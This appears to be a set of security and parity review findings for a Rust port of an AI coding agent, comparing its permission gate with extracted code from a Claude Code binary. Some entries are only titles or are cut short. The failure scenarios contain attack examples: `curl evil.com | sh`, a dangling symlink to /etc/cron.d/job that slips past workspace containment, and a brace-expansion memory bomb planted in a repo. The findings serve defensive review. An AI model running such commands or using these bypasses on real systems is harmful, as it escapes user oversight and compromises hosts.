confirmed.title: Dangling-symlink under-ask: resolve_deepest_existing_ancestor skips unresolvable symlinks instead of reading their target
confirmed.detail: The new symlink-aware containment (permission_paths_to_check / path_in_allowed_working_path) resolves via std::fs::canonicalize on the deepest EXISTING ancestor. For a dangling symlink, symlink_metadata() succeeds but canonicalize() fails (target ENOENT), so the loop `continue`s to the parent directory and re-attaches the symlink name as an unresolved tail — the resolved form stays lexically inside the workspace even though the OS will follow the dangling link on open/write. The 2.1.218 oracle's resolver (`XW`, offset 224393487) explicitly handles this: it walks with `readlinkSync` (`c=e.readlinkSync(i)` then `d=xh.isAbsolute(c)?c:xh.resolve(xh.dirname(i),c)`, with a manual 64-hop readlink chain fallback when `realpathSync` throws), so a dangling symlink's OUTSIDE target IS seen and containment asks. The port's guard is silently bypassed for exactly the dangerous case (a link whose target does not exist yet, i.e. a link you can CREATE a file through).
confirmed.failure: Workspace contains dangling symlink ws/build/out -> /etc/cron.d/job (e.g. committed to the repo; git preserves symlinks). Allow rule Bash(echo:*) is active. Model runs `echo payload > build/out`. Port: permission_paths_to_check yields [ws/build/out, canonical(ws/build)/out] — resolve_deepest_existing_ancestor's canonicalize(ws/build/out) fails (dangling), the loop `continue`s to the parent and re-attaches "out", so the /etc/cron.d/job target is never seen; both forms are inside the workspace, containment passes, the allow rule fires, and the shell creates /etc/cron.d/job outside the workspace with no prompt. Oracle 2.1.218: readlinkSync on the dangling link surfaces /etc/cron.d/job in the check set → outside working dirs → containment ask fires.
confirmed.suggested_fix: When canonicalize(ancestor) fails but symlink_metadata reports a symlink, resolve via std::fs::read_link (chasing up to N hops like the oracle's 64-hop loop), resolve the link target relative to the ancestor's parent, and use that as the resolved form; only fall through to the parent when the component is not a symlink.
confirmed.verify_reasoning: CONFIRMED by re-reading the port and re-extracting the oracle. Port (lingxi-code/permission/src/filesystem.rs:260-275, added by this diff): `let Ok(meta)=std::fs::symlink_metadata(ancestor) else {continue}; let Ok(resolved_ancestor)=std::fs::canonicalize(ancestor) else {continue};` — for a dangling symlink lstat succeeds but canonicalize (which follows the link) fails ENOENT, so the loop skips to the parent directory and re-attaches the link name as an unresolved tail; the link target is never read via readlink. path_in_allowed_working_path (filesystem.rs:507-521) then checks only lexically-inside forms. Oracle binary 2.1.218: extracted XW at offset 224393487 — `c=e.readlinkSync(i)` succeeds on dangling links, then `d=xh.isAbsolute(c)?c:xh.resolve(xh.dirname(i),c)`; when `realpathSync(i)` throws it enters the manual 64-hop chain where `y=e.lstatSync(_)` throwing on the nonexistent target breaks with `p=_` (the outside target) and returns `l(p)`; only readlink error === "ENOENT" (truly absent component, not a dangling link) takes the `s.unshift(xh.basename(i)); i=xh.dirname(i)` tail-re-attach path. The adjacent set-builder getPathsForPermissionCheck (~offset 224395800) likewise does `d=n.readlinkSync(a)` on the input path first and unconditionally `r.add(f)` for the resolved target — so the oracle's permission check set contains the dangling link's outside target. Reachable: path_in_allowed_working_path is the sole symlink-aware barrier at command_path_containment.rs:1124 (PathGuard::Check(resolved) is computed lexically), policy.rs:907, path_constraints.rs:671/745, sed_validation.rs:1289 — nothing else reads the link. The diff's own two tests only cover symlinks with EXISTING targets, so the gap is untested. This is an under-ask (missing permission prompt) for exactly the exploitable case — a link you can create a file through — so HIGH stands. Not a pre-existing condition: the pre-diff function was purely lexical under a documented accepted divergence; this diff introduced the partial (and wrong-on-dangling) symlink resolution.

confirmed.title: update_environment_variables applies ARBITRARY env keys — oracle restricts to a 2-key allowlist

confirmed.title: Monitor command evades the entire Bash permission pipeline (deny rules, bash-safety AST, & downgrade)

confirmed.title: Brace expansion budget diverges from oracle: 100k-result cap with truncation instead of 1000-results/4MiB with unexpanded-fallback; nested-brace semantics also differ
confirmed.detail: The rewrite claims parity with "the brace-expansion package's EXPANSION_MAX used by Claude Code 2.1.217" and caps at MAX_BRACE_EXPANSION_RESULTS = 100_000. The 2.1.218 binary's actual frontmatter-path expander (function `Fto`/`uCg`, offset 227495940) uses its own budget `{results: lCg=1000, bytes: cCg=4194304}` (constants at offset 227497937), and on exceeding it returns the pattern UNEXPANDED with a warn log (`Brace pattern expansion exceeds the budget; using it unexpanded: ...`) — it never truncates to the first N results the way `expand_braces_with_limits` does. Additionally the oracle expands via regex `^([^{]*)\{([^}]+)\}(.*)$` (body stops at the FIRST `}`), so nested input `{a,{b,c}}` yields `["a}","b","c"]` in the oracle, while the port's new balanced `split_first_brace_group` + `split_top_level_alternatives` yields `["a","b","c"]` — the tests `brace_expansion_preserves_nested_alternative_groups` and `frontmatter_paths_expand_nested_brace_groups_in_order` assert this non-oracle behavior. Finally, the port has NO byte budget: results are capped only by count, and `frontmatter_paths_values` puts no length bound on the value.
confirmed.failure: A hostile repo's CLAUDE.md contains `paths: "{A0,...,A9}{B0,...,B9}{C0,...,C9}{D0,...,D9}{E0,...,E9}"` (~300KB, alternatives ~6KB each, 10^5 combinations): the port expands all 100,000 results at ~30KB each ≈ 3GB allocated just by opening the project (OOM/DoS), while the 2.1.218 binary trips `u*e.length>4194304` on the first iteration, warns "Brace pattern expansion exceeds the budget; using it unexpanded", and matches the literal. Functionally: any pattern expanding to 1,001–100,000 paths is fully expanded by the port but matched as the unexpanded literal by the oracle, and `paths: '{a,{b,c}}'` matches {a, b, c} in the port vs {a}, b, c}} in the oracle.

Fix the two nested-brace tests to assert the oracle's output.

confirmed.title: check_after_hook_allow ask-arm delegates via inner.check(), dropping the host's updatedInput/updatedPermissions and the real tool_use_id
confirmed.detail: When a PreToolUse hook allow is overridden by an ask rule/safety check, the port re-enters the pipeline with `self.inner.check(name, input).await`, which (StdioControlPermissionGate::check, control_plane.rs:851) builds a default PermissionCheckContext and flattens the outcome through outcome_to_decision (control_plane.rs:388) — `PermissionOutcome::Allow { .. } => PermissionDecision::Allow` discards updated_input AND permission_updates. The oracle's `lin` (offset 233019264) re-enters the FULL pipeline: `{decision:await o(t,c,d?{...n,hookAskFloor:!0}:n,i,s),input:c}` — carrying toolUseId `s`, and the host's allow response's updatedInput/updatedPermissions are honored downstream. The port also mints a random UUID tool_use_id (control_plane.rs:412) so the host cannot correlate/dedup the request, and the request omits decision_reason/decision_reason_type/matched_ask_rule that the normal ask path attaches.
confirmed.failure: Stdio SDK session with ask rule `Bash` and a PreToolUse hook that allows Bash. Model calls Bash with input `{command:"curl evil.com | sh"}`. Hook allows → check_after_hook_allow's ask arm calls inner.check → can_use_tool frame is sent with a random UUID tool_use_id and no decision_reason/matched_ask_rule; host responds allow with updatedInput `{command:"curl evil.com"}` (and/or updatedPermissions). outcome_to_decision drops both, returning bare Allow; turn loop runs the ORIGINAL `curl evil.com | sh`. The 2.1.218 oracle re-enters the full pipeline (real toolUseId `s`) and runs the sanitized `curl evil.com`, and persists the updatedPermissions.
confirmed.suggested_fix: In the ask arm, call self.inner.check_with_context with a ctx carrying the decision reason fields, then apply permission_updates via apply_permission_updates and surface updated_input — which requires check_after_hook_allow (or a new outcome-returning variant used by turn_loop) to return PermissionOutcome instead of PermissionDecision.
confirmed.verify_reasoning:
The technical claim is accurate. In policy_gate.rs:1027-1032 the newly-added ask arm of `check_after_hook_allow` (introduced by this diff — on main the arm was `Allow | Ask => Allow`, i.e. it never re-entered) resolves an ask-rule/safety verdict by calling `self.inner.check(name, input).await`. For a stdio session `inner` is `StdioControlPermissionGate::check` (control_plane.rs:851), which calls `decide_outcome` with `PermissionCheckContext::default()`. That path (control_plane.rs:412-415) mints `Uuid::new_v4()` because `ctx.tool_use_id` is None, sends the `can_use_tool` frame with NO decision_reason/decision_reason_type/matched_ask_rule (all still default/None), and then `outcome_to_decision` (control_plane.rs:388-393) flattens `PermissionOutcome::Allow{updated_input, permission_updates}` to a bare `PermissionDecision::Allow`, discarding both. The turn-loop caller (turn_loop.rs:2732-2735) consumes only that `PermissionDecision` and never touches `effective_input`, so any host rewrite is lost.

I re-extracted `lin` from the 2.1.218 binary (offset 233019264): the ask arm is `return C(...),{decision:await o(t,c,d?{...n,hookAskFloor:!0}:n,i,s),input:c}` — it re-enters the SAME full permission function `o` used on the normal path, carrying the real toolUseId `s` and the hookAskFloor context. From the call site (offset ~233030001, function `t4_`) the returned decision is honored downstream via `m=D.updatedInput??v`, so the oracle DOES apply the host's canUseTool `updatedInput`. The port's context-carrying equivalent already exists and is used on the normal ask path (`decide_outcome_with_context` at policy_gate.rs:493-537, plus check_with_context at turn_loop.rs:2874-2895), which enriches ctx with decision_reason/matched_ask_rule, passes the real tool_use_id, and applies updated_input + permission_updates — the hook-allow ask arm bypasses all of it. So the divergence is real and reachable: with an ask rule on Bash + a PreToolUse hook that allows Bash, if the SDK host's canUseTool returns allow with a sanitizing `updatedInput`, the oracle runs the sanitized command while the port runs the model's original. The new test (policy_gate_test.rs:447-471) uses a RecordingInner returning a bare decision, so it exercises only the deny/delegate direction and asserts NOTHING about updatedInput/permission_updates/tool_use_id — the honoring path has no test, consistent with the finding.

The genuine defect is an incomplete port — the host's allow-with-input-constraint is not fully honored, and the request carries a fabricated tool_use_id and omits decision_reason — with a narrow security flavor (running the un-sanitized command the oracle would not) that requires the uncommon case of a host using canUseTool updatedInput as a sanitizer.

confirmed.title: gitignore side-effect targets the project's .gitignore and BLOCKS settings persistence on failure; oracle writes the GLOBAL git excludes, fire-and-forget
confirmed.detail: ensure_local_settings_ignored appends `/.lingxi/settings.local.json` to `<cwd>/.gitignore` and is called synchronously inside mutate_settings_file BEFORE the settings write — any failure (including the deliberately-rejected symlinked .gitignore, locked in by test local_persistence_rejects_symlinked_gitignore_before_writing_settings) aborts the settings write entirely. The 2.1.218 oracle instead calls `a9n(_Q("localSettings"),fn()).then(...)` (offset 225373886) — non-blocking, errors only logged — and `a9n`/`uEh` (offset 225188500) write `**/<relpath>` to the GLOBAL excludes file (`git config --global core.excludesfile` or `~/.config/git/ignore`), gated on `git check-ignore`; it never mutates the repo's tracked .gitignore.
confirmed.failure: In a repo whose .gitignore is a symlink (common dotfiles/monorepo setup), the user answers "Always allow" persisting to localSettings: the port's ensure_local_settings_ignored hits rooted_fs's no-follow rejection, mutate_settings_file returns PersistError::Confined before the settings atomic_write, the rule is never persisted, and the user is re-prompted every session — the 2.1.218 oracle persists the rule first and only then fire-and-forget appends `**/.claude/settings.local.json` to the GLOBAL git excludes (log-only on failure). In normal repos the port additionally dirties the user's version-controlled .gitignore, which the oracle deliberately never touches.
confirmed.suggested_fix: Match the oracle: write the rule to the global git excludes file (core.excludesfile fallback ~/.config/git/ignore), gate on git check-ignore, and make the write best-effort (log, never propagate the error into the settings write path).

confirmed.title: ask_with_rule invents a permission_suggestions payload the 2.1.218 oracle does not emit for ask-rule asks — and the suggestion is inert in the port
confirmed.detail: ask_with_rule now attaches metadata.permission_suggestions = [{type:"addRules", rules:[matched rule], behavior:"allow", destination:"session"}] to every matched-ask-rule Ask, and decide_outcome_with_context forwards it onto the can_use_tool wire. The oracle's ask-rule arms carry NO suggestions: `_pt` (offset 235911075) returns `{behavior:"ask",decisionReason:{type:"rule",rule:c},message:Lh(e.name)}`, and `createCanUseTool` (offset 244459000) sends `permission_suggestions: a.suggestions` where only tool-specific checkPermissions producers (chrome/MCP/etc.) ever populate it — the Bash prefix suggestions (`Spr`) are only PREPENDED when result suggestions already exist. So the port emits a key on every ask-rule prompt where the oracle omits it. Worse, the suggested session allow rule is ineffective in the port itself: the port's walk is deny → ASK → allow (policy.rs:407-409), so after a host applies the suggested allow rule the identical ask rule still matches first and the user is re-asked forever.
confirmed.failure: Configure ask rule Bash(git push:*), run under an SDK stdio host: the port's can_use_tool request carries "permission_suggestions":[{"type":"addRules","rules":[{"toolName":"Bash","ruleContent":"git push:*"}],"behavior":"allow","destination":"session"}] where the 2.1.218 oracle omits the key (mXd strips suggestions; undefined is dropped from the frame). The host renders "always allow for session"; the user accepts; the host sends updatedPermissions addRules allow/session; the next `git push` STILL asks because the ask walk (policy.rs:588-601) precedes the allow walk — a byte divergence plus a permanently broken affordance the oracle never offers.
confirmed.suggested_fix: Remove the invented suggestion from ask_with_rule (keep metadata plumbing for genuine tool-specific producers), or if kept intentionally, at minimum make an applied same-content session allow actually suppress the ask.
confirmed.verify_reasoning: Port: policy.rs:2517-2553 ask_with_rule attaches metadata.permission_suggestions=[{type:"addRules",rules:[matched rule],behavior:"allow",destination:"session"}] to every matched-ask-rule Ask (both call sites :590 tool-wide and :600 content), and policy_gate.rs:515-516 -> control_plane.rs:462-463 put it on the stdio can_use_tool frame as "permission_suggestions" (tests control_plane.rs:1381-1400 and policy_gate_test.rs:1132 lock in the divergent behavior). Oracle 2.1.218 re-extracted: mXd (@~235910700) is the matched-ask-rule handler — its default arm is {behavior:"ask",decisionReason:{type:"rule",rule:n},message:Lh(e.name)} with NO suggestions, and when the tool's own checkPermissions returns an ask it EXPLICITLY strips them: `if(s?.behavior==="ask"){let{suggestions:a,...l}=s;return{...l,matchedAskRule:n}}` — so even WebFetch's own `suggestions:FIs(n)` (@232623708) never survives an ask-rule match. createCanUseTool (@~244460000) sends `permission_suggestions:c` where `c=a.suggestions` (undefined here) and only prepends Bash Spr suggestions `if(c?.length)`; JSON.stringify drops the undefined, and the pbm wire schema (@244401655) declares the field `.optional()` — the oracle omits the key entirely for ask-rule prompts. Inertness also confirmed: the port's precedence (policy.rs:564-601, deny -> tool-wide ask 1c -> content ask 1d -> allow) matches the oracle's _pt (AB deny -> zun content deny -> iIe/mXd ask -> allow), so a host-applied session allow rule for the same content can never outrank the ask rule — the user is re-asked forever, which is exactly why the oracle offers no such suggestion. Not a security under-ask (the prompt still fires), so MEDIUM stands.

confirmed.title: Full no-follow component walk rejects symlinked settings directories the oracle accepts — permission persistence breaks for dotfiles users
confirmed.detail: confined_settings_path + rooted_fs open every path component with O_NOFOLLOW from the confinement root (HOME parent for userSettings, cwd for project/local), so a symlinked `~/.lingxi` or project `.lingxi` (extremely common dotfiles pattern — the dir symlinked into a dotfiles repo) makes EVERY rule/mode/directory persist fail with PersistError::Confined (test confined_persistence_rejects_symlinked_settings_directory locks this in). The 2.1.218 oracle's hardened settings write only opens the STAGING DIR itself with O_RDONLY|O_DIRECTORY|O_NOFOLLOW (offset 228540300) — intermediate components like a symlinked .claude dir are resolved normally by the OS, so persistence works there.
confirmed.failure: User has `~/.lingxi -> ~/dotfiles/lingxi` (dotfiles-managed config dir). Any persistence targeting the UserSettings destination — /permissions rule add/remove at user scope, defaultMode persist to user settings, additionalDirectories at user scope — hits confined_settings_path (root = HOME parent, relative = `.lingxi/settings.json`) → rooted_fs::open_parent opens the `.lingxi` component with O_NOFOLLOW → ELOOP → FsError::OutsideWorkspace → PersistError::Confined, and nothing is ever written; CC 2.1.218 passes allowSymlink:true for userSettings and writes through the symlink successfully (logs "Writing through symlink"), so the same setup works in the oracle.
confirmed.suggested_fix: Follow the oracle's contract: enforce NOFOLLOW on the final component (and the staging/temp file) only, or canonicalize the settings dir once and use IT as the confinement root, rather than refusing all intermediate symlinks.
confirmed.verify_reasoning:
CONFIRMED, but with the scope cut in half — only the userSettings destination diverges; the project/local-settings half of the claim (and its indictment of the port's test) is refuted.

Port code re-read: lingxi-code/permission/src/persist.rs:93-136 (confined_settings_path: UserSettings root = lingxi_home.parent() with relative `.lingxi/settings.json`; Project/Local root = cwd with relative `.lingxi/settings*.json`) and lingxi-code/platform-api/src/rooted_fs.rs:808-858 — open_root canonicalizes the root, then open_parent opens EVERY intermediate component with `OFlags::RDONLY|DIRECTORY|NOFOLLOW` (line 849-855), and map_unix_io (line 795) maps ELOOP/ENOTDIR to FsError::OutsideWorkspace, surfacing as PersistError::Confined. There is no allowSymlink concept or userSettings exemption anywhere in rooted_fs or persist.rs (grep for allowSymlink/allow_symlink: zero hits), so a symlinked `~/.lingxi` OR project `.lingxi` both hard-fail every persist (rules, mode, directories — all go through mutate_settings_file).

Binary re-extraction (/Users/luolingfeng/.local/share/claude/versions/2.1.218): `_Ch` = updateSettingsForSource (near offset 225373349) does `let c=wwt(yQ.dirname(r)); await O5(r, ..., {allowSymlink: e==="userSettings"||c, checkParentDir: (e==="projectSettings"||e==="localSettings")&&!c, stagingDir: yQ.join(yQ.dirname(r),p_e)})`. The writer tIi/O5 (offsets ~225108000-225112082) shows the exact semantics: (a) allowSymlink → `readlinkSync(e)` and "Writing through symlink: ${e} -> ${i}" with NO parent check, intermediates resolved normally; staging helper I2l on ELOOP of the staging dir with allowSymlink set returns the sibling-temp fallback, so the write SUCCEEDS through a symlinked ~/.claude. (b) checkParentDir → `openSync(dirname(e), O_RDONLY|O_DIRECTORY|O_NOFOLLOW)` and on ELOOP/ENOTDIR throws `Refusing to write into symlinked directory: ${dirname(e)}` — O_NOFOLLOW applies to the final component, i.e. the project `.claude` dir itself, so a symlinked project `.claude` is REJECTED by the oracle too (same pattern in scheduled-task save U7r and workflow save x5a, which even run the full assertDirChainReal w4n walk for non-user scopes — offset 225103944 shows w4n is a full per-component NOFOLLOW walk, refuting the reviewer's premise that the oracle "only opens the staging dir with NOFOLLOW").

Consequences: (1) REAL divergence for UserSettings only — port rejects symlinked `~/.lingxi`, oracle explicitly allows and writes through it. (2) The reviewer's project scenario (`proj/.lingxi -> ../shared/.lingxi`) FAILS in the oracle as well ("Refusing to write into symlinked directory"), so the port matches there, and the test confined_persistence_rejects_symlinked_settings_directory (persist.rs:858, which symlinks a PROJECT .lingxi) asserts correct parity behavior, not wrong behavior. confirmed.title: PermissionRequest hook rescue without updatedInput re-checks rules; oracle lets the allow stand
confirmed.detail: In the PermissionResolution::Ask branch, a PermissionRequest hook 'allow' WITHOUT a rewrite is routed to orch.perms.check_after_hook_allow(), which (per HOOKALLOW-01's lin port) re-runs the rule/safety verdict UNCONDITIONALLY and, on an ask-rule/safety verdict, delegates to the inner prompt transport. The 2.1.218 oracle's headless rescue `Fxy` re-checks ONLY when the hook supplied updatedInput or the tool requiresUserInteraction: `if(a.behavior==="allow"){let l=a.updatedInput??t;if(a.updatedInput||e.requiresUserInteraction?.()){let c=epr(await _pt(e,l,...));if(c)return c.behavior==="ask"?{behavior:"deny",...}:c}...return{behavior:"allow",updatedInput:l,...}}` (binary offset ~235907300). Without a rewrite the allow STANDS with no re-check. On main (pre-diff) the port also let the allow stand (old check_after_hook_allow mapped Ask→Allow), so this diff introduces the regression. The block's own comment states the oracle contract ("re-checks the rules ONLY when the hook supplied updatedInput") and then does the opposite for the non-rewrite case.
confirmed.failure: Headless (-p/SDK) session with settings ask rule Bash(git push:*) and a PermissionRequest hook returning {"behavior":"allow"} with no updatedInput. Model calls Bash(git push origin main): gate resolves Ask (ask rule matched); hook allows. Oracle 2.1.218 Fxy: re-check gate `a.updatedInput||e.requiresUserInteraction?.()` is false → returns {behavior:"allow"} → command runs. Port: turn_loop.rs:2851 routes to check_after_hook_allow → rule_or_safety_verdict returns Some(Ask) (MatchedRule behavior:Ask) → policy_gate.rs:1032 self.inner.check → headless gate auto-denies → tool_result "permission denied". Interactively, the user is re-prompted despite the hook allow. The rescue is defeated in exactly its primary use case.
confirmed.suggested_fix: In the non-rewritten arm, honour the hook allow directly (PermissionDecision::Allow, plus record_auto_mode_non_deny bookkeeping) instead of calling check_after_hook_allow; keep check_after_hook_allow_rewritten for the updatedInput case, and wire the requiresUserInteraction trigger (the flag is already computed at line 2754) into the rewritten-style re-check.
confirmed.verify_reasoning: CONFIRMED by binary re-extraction and code re-read. (1) Oracle Fxy at offset ~235907300 extracted verbatim: `if(a.behavior==="allow"){let l=a.updatedInput??t;if(a.updatedInput||e.requiresUserInteraction?.()){let c=epr(await _pt(e,l,...));if(c)return c.behavior==="ask"?{behavior:"deny",...}:c}...return{behavior:"allow",updatedInput:l,decisionReason:{type:"hook",hookName:"PermissionRequest"}}}` — the _pt re-check runs ONLY with updatedInput or requiresUserInteraction; a non-rewrite allow stands unchecked. Its call site (~235925295) is the `shouldAvoidPermissionPrompts` headless-ask path, exactly what the port's PermissionResolution::Ask + PermissionRequest-hook branch models. (2) Oracle lin (offset 233018472) extracted: `let u=await _pt(t,c,...)` UNCONDITIONALLY, `u?.behavior==="ask"` → full pipeline — so unconditional-recheck semantics are PreToolUse-only. (3) Port: turn_loop.rs:2841-2853 sends the non-rewrite PermissionRequest allow to check_after_hook_allow (policy_gate.rs:1012-1040), which re-checks unconditionally and on Some(Ask) delegates to self.inner.check (interactive re-prompt / headless deny). rule_or_safety_verdict (policy_gate.rs:293-335) returns Some(Ask) for MatchedRule{behavior:Ask}, so an ordinary ask rule — the very reason the gate resolved Ask — triggers the divergence. confirmed.title: Hot resume force-adopts the DEFAULT_MODEL seed when the transcript has no real assistant model row
confirmed.detail: resume_session adopts the replayed model gated on `!runtime.model.is_empty()`, documented as "Legacy/default callers leave the live values unchanged by passing an empty model". But the ONLY production producer, ReplayedSession::handle_runtime_snapshot (resume.rs:64), fills `model: self.state.model.clone()`, and build_state_from_jsonl seeds state with `SessionState::empty(_, DEFAULT_MODEL)` ("claude-opus-4-8") — never empty. The model-recovery loop only overwrites the seed when an assistant line carries a real (non-`<synthetic>`) model. So for a transcript containing only user rows or only synthetic api-error assistant rows, the snapshot carries DEFAULT_MODEL and `model_profile: None`, and the hot resume overwrites the live session's model and provider profile with them. The empty-model escape hatch is dead code for real callers, and the new test only covers ResumeRuntimeSnapshot::default(), not the production producer.

(1) handle_impl.rs:157-160 adopts runtime.model/model_profile gated only on !runtime.model.is_empty(); git diff main..HEAD shows this diff REMOVED the prior contract "s.model is intentionally LEFT UNCHANGED — resume keeps the live model ... the live model is the source of truth", so this is new behavior, not pre-existing. confirmed.title: bash_command handler blocks the input loop and omits <bash-exit-code> in the output frame
confirmed.detail: The newly-wired `StreamInput::Bash` arm builds `"<bash-stdout>{stdout}</bash-stdout><bash-stderr>{stderr}</bash-stderr>"` and AWAITS `runtime.bash_runner.run(...)` inline in the stdin select loop. Two divergences from the 2.1.218 oracle's `runHeadlessBashCommand`/print.ts path: (1) The oracle's output frame is `outputText:\`<${tAt}>${La(i)}</${tAt}><${Gge}>${La(s||c)}</${Gge}><${PCi}>${a}</${PCi}>\`` — i.e. it appends a `<bash-exit-code>${a}</bash-exit-code>` block (and sanitizes via `La()`); the port emits no exit-code block and no sanitization. confirmed.title: reconnect_one mutates connection state outside the new per-server lifecycle lock
confirmed.detail: The WIP introduces `lifecycle_locks` to serialize connect/disconnect/set_disabled/reconnect per server, and `disconnect_locked` explicitly relies on it ("The per-server lifecycle lock prevents a concurrent connect from racing this await"). But `reconnect_one` (registry.rs:1313-1345) performs its disabled/stopped guard read AND the `connections.write().insert(name, McpConnectionState::Reconnecting{config: stale_config,..})` WITHOUT acquiring the lifecycle lock; only the subsequent `self.connect()` takes it. The check-then-act pair (guard at ~1315, insert at ~1333) can interleave with a fully-locked `set_disabled`/`disconnect`/`connect` critical section.

confirmed.title: Per-server lifecycle mutex held across unbounded interactive OAuth wait

confirmed.title: Exact-count failure and image-bearing content truncate where 2.1.218 forwards verbatim
confirmed.detail: The new exact-count stage claims to "mirror Claude's two-stage guard" (large_output.rs module doc), but the 2.1.218 oracle's needs-truncation predicate is: `async function AJr(e){if(!e)return!1;if(iHt(e)<=Fmo()*Ds_)return!1;try{let n=await aHt([{role:"user",content:e}],[]);return!!(n&&n>Fmo())}catch(r){return ke(r),!1}}` — on token-count API FAILURE it returns false, i.e. the content is forwarded to the model VERBATIM, and the count call receives the whole content including image blocks. The port does the opposite twice: (1) mcp_tool.rs:666-670 maps `Err(_)` to `None`, and large_output.rs:105 treats `None` as "enter large-output handling" (persist-to-file/truncate); (2) mcp_tool.rs:661 skips counting entirely whenever `content_contains_images`, so image-bearing content whose rough estimate exceeds 12 500 tokens is ALWAYS truncated (images path never persists), even when the oracle's API count would come back ≤ 25 000 and forward it whole.

Likewise, a 5xx from the count endpoint on a pure-text 15,000-token result makes the port persist it to a file stub ("Error: result … saved to …") while the oracle forwards it inline.
confirmed.suggested_fix: For the Anthropic route, match the oracle: on count error forward verbatim (keep the conservative path only for routes with no count endpoint, which is the accepted multi-provider divergence), and include image blocks in the counted content instead of skipping the count.
confirmed.verify_reasoning: Re-read lingxi-code/tools/mcp/src/mcp_tool.rs:659-683 and lingxi-code/tools/mcp/src/large_output.rs:85-123 on the gap218/wave working tree, and re-extracted the oracle from /Users/luolingfeng/.local/share/claude/versions/2.1.218. Binary AJr (offset 229866922): `async function AJr(e){if(!e)return!1;if(iHt(e)<=Fmo()*Ds_)return!1;try{let n=await aHt(typeof e==="string"?[{role:"user",content:e}]:[{role:"user",content:e}],[]);return!!(n&&n>Fmo())}catch(r){return ke(r),!1}}` — the exact count receives the FULL content (image blocks included) and a count failure returns false, i.e. forward verbatim. Binary zWu/processMCPResult (offset ~230543900): `if(!await AJr(i))return i; ... if(pWu(i))return ...await QFe(i);` — the image→truncate branch runs only AFTER AJr confirmed the exact count exceeds the 25,000 cap. The port inverts both: (1) mcp_tool.rs:671 maps a count Err to None, and large_output.rs:105 (`exact_token_count.is_some_and(|t| t <= cap)`) treats None as "enter large-output handling", so a transient count-endpoint failure persists/truncates where the oracle forwards inline; (2) mcp_tool.rs:661 skips counting whenever content_contains_images, so every image-bearing result estimating >12,500 tokens is truncated (large_output.rs:121-123) even when the oracle's API count would come back ≤25,000 and forward it whole. The diff itself introduced this stage (`process_mcp_result` → `process_mcp_result_with_exact_count` + the new counting block); no other guard exists on this path. Parity-only divergence in the model-facing tool result — no security impact — so MEDIUM stands.

confirmed.title: mode_from_values diverges from oracle qzr(): auto:N>32767 becomes Auto{10} instead of Standard, literal "tst-auto" becomes Auto instead of Enabled, and unrecognized values become Standard instead of Enabled
confirmed.detail: Oracle `qzr()` (offset ~228783300): `Yos(e)` parses `auto:N` then clamps `Math.max(0,Math.min(100,r))`; `B5g(e)` is exactly `e==="auto" || e.startsWith("auto:")`; the final fallthrough for any value that is neither auto-form, truthy, nor defined-falsy is `return "tst"` (enabled). The port diverges three ways: (a) line 97 parses the digits with `parse::<i16>().unwrap_or(10)` — any N > 32767 (e.g. `auto:99999`) fails the i16 parse and silently becomes `Auto{percentage:10}`, whereas the oracle clamps to 100 → "standard" (tool search fully OFF); (b) line 87 maps the literal value `tst-auto` to `Auto{10}`, but in the oracle `B5g("tst-auto")` is false so it falls through to plain `"tst"` (unconditionally enabled, no threshold); (c) line 110 returns `Standard` for any unrecognized value (e.g. `ENABLE_TOOL_SEARCH=enabled`), where the oracle returns `"tst"`. (The port also lowercases before matching; the oracle's `auto`/`auto:` checks are case-sensitive.)
confirmed.failure: `ENABLE_TOOL_SEARCH=enabled` (or any other unrecognized non-truthy/non-falsy string): oracle qzr() falls through to `return "tst"` — tool search ON, deferral unconditional; the port's mode_from_values (defer.rs:110) returns ToolSearchMode::Standard — tool search OFF. Inverted behavior from one env value. Also: `ENABLE_TOOL_SEARCH=auto:99999` → oracle clamps to 100 → "standard" (off); port's `parse::<i16>().unwrap_or(10)` (defer.rs:97) overflows → Auto{10} (on at 10% threshold). And `ENABLE_TOOL_SEARCH=tst-auto` → oracle: B5g("tst-auto") is false (only "auto"/"auto:*") so it falls through to "tst" (unconditional); port (defer.rs:87) maps it to Auto{10} (conditional threshold).
confirmed.suggested_fix: Parse N with a wide type (i64/f64) before clamping to 0..=100; map literal "tst-auto" to Enabled; make the final fallthrough Enabled to mirror qzr()'s `return "tst"`.
confirmed.verify_reasoning: I re-extracted the 2.1.218 oracle myself. At offset ~228782500 the binary reads verbatim: `function Yos(e){if(!e.startsWith("auto:"))return null;let t=e.slice(5),r=Ld(t);if(isNaN(r))return C(`Invalid ENABLE_TOOL_SEARCH value "${e}": expected auto:N where N is a number.`),null;return Math.max(0,Math.min(100,r))}function B5g(e){if(!e)return!1;return e==="auto"||e.startsWith("auto:")}function qzr(){if(Q_e())return"standard";let e=process.env.ENABLE_TOOL_SEARCH,t=e?Yos(e):null;if(t===0)return"tst";if(t===100)return"standard";if(B5g(e))return"tst-auto";if(Jt(e))return"tst";if(nu(process.env.ENABLE_TOOL_SEARCH))return"standard";return"tst"}`. The port at /Users/luolingfeng/Projects/LingXi-Next/lingxi-code/tool-api/src/defer.rs (mode_from_values, lines 76-111; doc comment still cites 2.1.216 `e$r()`) diverges in all three flagged ways: (a) line 97 `numeric.parse::<i16>().unwrap_or(10)` — any N > 32767 fails the i16 parse and silently becomes Auto{10}, where the oracle clamps to 100 → "standard"; (b) line 87 treats the literal input "tst-auto" as Auto{10}, but B5g("tst-auto") is false in the oracle (it only accepts "auto"/"auto:*"), and "tst-auto" is neither Jt-truthy nor nu-falsy, so qzr falls through to plain "tst" (unconditional enable); (c) line 110 returns Standard for unrecognized values, where qzr's final statement is `return "tst"` — e.g. "enabled" turns the feature ON in the oracle and OFF in the port. confirmed.title: One-click bypassPermissions with no acceptance dialog (oracle requires explicit consent)
confirmed.detail: The new permission-mode dropdown applies 'Full access' (bypassPermissions) via a single click: `onClick={() => { if (!selected) invoke(() => bridge.setPermissionMode(mode.id)); ... }}` with no confirmation. validation.ts:107-111 allowlists 'bypassPermissions' from the renderer, and the bridge-server boots every trusted desktop workspace with `allow_dangerously_skip_permissions: trusted` (apps/bridge-server/src/boot.rs:471), so the engine accepts it. The 2.1.218 oracle gates this mode behind a mandatory acceptance dialog — extracted from the binary at offset ~147011300: "In Bypass Permissions mode, Claude Code will not ask for your approval before running potentially dangerous commands... By proceeding, you accept all responsibility for actions taken while running in Bypass Permissions mode... Yes, I accept / No, exit" — and behind an explicit --dangerously-skip-permissions launch opt-in. The desktop replaces both with workspace trust (whose dialog only says 'Project settings can run hooks, tools, and MCP servers' and never mentions unlocking full bypass) plus one un-confirmed click. packaged-app-smoke.mjs:541 codifies the no-confirmation behavior as the expected contract ('trusted desktop sessions must acknowledge live permission-mode changes, including explicit Full access').
